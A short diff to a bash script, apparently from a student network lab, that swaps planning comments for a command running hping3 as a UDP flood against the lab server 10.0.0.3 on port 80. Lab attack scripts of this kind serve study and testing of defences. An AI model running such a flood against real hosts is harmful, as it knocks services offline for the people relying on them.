@@ -1,4 +1,4 @@
 ﻿#!/bin/bash
-# Friend 1 - Attack flood script (hping3 from h2 -> h3)
-# See docs/TEAM_PLAN.md -> Friend 1, Week 4
-
+echo "🚨 LAUNCHING UDP FLOOD ATTACK to h3 (Server: 10.0.0.3) 🚨"
+echo "Press Ctrl+C to stop the attack."
+sudo hping3 --flood --udp -p 80 10.0.0.3
